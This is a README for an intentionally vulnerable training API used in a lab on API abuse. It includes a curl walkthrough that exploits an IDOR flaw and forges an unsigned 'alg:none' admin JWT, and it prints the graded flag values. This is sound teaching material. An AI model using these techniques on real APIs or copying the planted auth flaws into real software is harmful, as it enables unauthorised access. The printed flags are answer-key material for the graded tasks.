# vulnapi — the live target for Lab 3 (API abuse)

A tiny, intentionally-vulnerable REST API that backs the API-abuse module. It
holds no real data and targets no real backend — every "flag" is a training
value. Learners exploit it directly (curl / Burp / mitmproxy) and submit the
flags they recover to MASDojo, which grades by value.

Runs at **http://localhost:8091** under `docker compose up`.

## Vulnerabilities

| Endpoint | Vulnerability | Task | Flag |
|----------|---------------|------|------|
| `GET /orders/{id}` | **IDOR** — authenticated but no ownership check; order `1337` isn't yours | 071 | `FLAG{id0r_cr0ss_us3r}` |
| `GET /admin/ledger` | **JWT alg:none** — the verifier trusts the header `alg`; a forged unsigned `role=admin` token is accepted | 072 | `FLAG{jwt_n0n3_f0rg3d}` |

The flags match each task's `grader/expected.json`, so exploiting the live API
recovers exactly the value the grader expects. (The tasks also ship an offline
capture/dump artifact, so they remain solvable for self-study without the API.)

## Walkthrough

```bash
# 1) get a normal-user token
TOK=$(curl -s -X POST localhost:8091/login -H 'Content-Type: application/json' \
      -d '{"username":"demo","password":"demo"}' | jq -r .access_token)

# 2) IDOR: your own order is mundane; tamper the id to read another user's
curl -s localhost:8091/orders/1002 -H "Authorization: Bearer $TOK"   # boring
curl -s localhost:8091/orders/1337 -H "Authorization: Bearer $TOK"   # -> IDOR flag in note

# 3) JWT alg:none: a normal token is refused by /admin ...
curl -s localhost:8091/admin/ledger -H "Authorization: Bearer $TOK"  # 403
#    ... forge an unsigned admin token: header {"alg":"none"} . {"role":"admin"} . (empty sig)
FORGED='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.'
curl -s localhost:8091/admin/ledger -H "Authorization: Bearer $FORGED"  # -> JWT flag
```

## Test

```bash
cd vulnapi && python -m pytest tests/   # proves both exploits work + flags match the tasks
```
